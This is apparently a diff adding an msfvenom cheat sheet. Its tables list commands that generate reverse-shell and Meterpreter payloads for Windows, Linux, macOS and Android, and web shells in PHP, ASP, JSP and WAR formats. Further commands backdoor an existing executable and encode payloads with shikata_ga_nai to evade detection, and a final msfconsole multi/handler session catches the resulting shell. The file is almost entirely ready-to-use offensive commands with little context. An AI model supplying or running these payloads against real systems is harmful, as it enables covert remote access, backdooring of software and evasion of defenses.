@@ -1,0 +1,99 @@
+Binaries
++---------------------------------------+--------------------------------------+
+|                Command                |                 Info                 |
++=======================================+======================================+
+| msfvenom -p                           | Creates a simple TCP Payload for     |
+| windows/meterpreter/reverse_tcp       | Windows                              |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -f exe >            |                                      |
+| example.exe                           |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p                           | Creates a simple HTTP Payload for    |
+| windows/meterpreter/reverse_http      | Windows                              |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -f exe >            |                                      |
+| example.exe                           |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p                           | Creates a simple TCP Shell for Linux |
+| linux/x86/meterpreter/reverse_tcp     |                                      |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -f elf >            |                                      |
+| example.elf                           |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p osx/x86/shell_reverse_tcp | Creates a simple TCP Shell for Mac   |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -f macho >          |                                      |
+| example.macho                         |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p                           | Creats a simple TCP Payload for      |
+| android/meterpreter/reverse/tcp       | Android                              |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} R > example.apk     |                                      |
++---------------------------------------+--------------------------------------+
+
+Web Payloads
++---------------------------------------+--------------------------------------+
+|                Command                |                 Info                 |
++=======================================+======================================+
+| msfvenom -p                           | Creats a Simple TCP Shell for PHP    |
+| php/meterpreter_reverse_tcp           |                                      |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -f raw >            |                                      |
+| example.php                           |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p                           | Creats a Simple TCP Shell for ASP    |
+| windows/meterpreter/reverse_tcp       |                                      |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -f asp >            |                                      |
+| example.asp                           |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p                           | Creats a Simple TCP Shell for        |
+| java/jsp_shell_reverse_tcp LHOST={DNS | Javascript                           |
+| / IP / VPS IP} LPORT={PORT /          |                                      |
+| Forwarded PORT} -f raw > example.jsp  |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p                           | Creats a Simple TCP Shell for WAR    |
+| java/jsp_shell_reverse_tcp LHOST={DNS |                                      |
+| / IP / VPS IP} LPORT={PORT /          |                                      |
+| Forwarded PORT} -f war > example.war  |                                      |
++---------------------------------------+--------------------------------------+
+
+Windows Payloads
++---------------------------------------+--------------------------------------+
+|                Command                |                 Info                 |
++=======================================+======================================+
+| msfvenom -l encoders                  | Lists all avalaible encoders         |
++---------------------------------------+--------------------------------------+
+| msfvenom -x base.exe -k -p            | Binds an exe with a Payload          |
+| windows/meterpreter/reverse_tcp       | (Backdoors an exe)                   |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -f exe >            |                                      |
+| example.exe                           |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -p                           | Creates a simple TCP payload with    |
+| windows/meterpreter/reverse_tcp       | shikata_ga_nai encoder               |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -e                  |                                      |
+| x86/shikata_ga_nai -b '\x00' -i 3 -f  |                                      |
+| exe > example.exe                     |                                      |
++---------------------------------------+--------------------------------------+
+| msfvenom -x base.exe -k -p            | Binds an exe with a Payload and      |
+| windows/meterpreter/reverse_tcp       | encodes it                           |
+| LHOST={DNS / IP / VPS IP} LPORT={PORT |                                      |
+| / Forwarded PORT} -e                  |                                      |
+| x86/shikata_ga_nai -i 3 -b "\x00" -f  |                                      |
+| exe > example.exe                     |                                      |
++---------------------------------------+--------------------------------------+
+
+How do I get the meterprater shell?
+
+	nli@nlistation:~$ sudo msfconsole 
+	msf > use exploit/multi/handler
+	msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+	payload => windows/meterpreter/reverse_tcp
+	msf exploit(multi/handler) > set lhost 192.168.1.123
+	lhost => 192.168.1.123
+	msf exploit(multi/handler) > set lport 4444
+	lport => 4444
+	msf exploit(multi/handler) > run
+
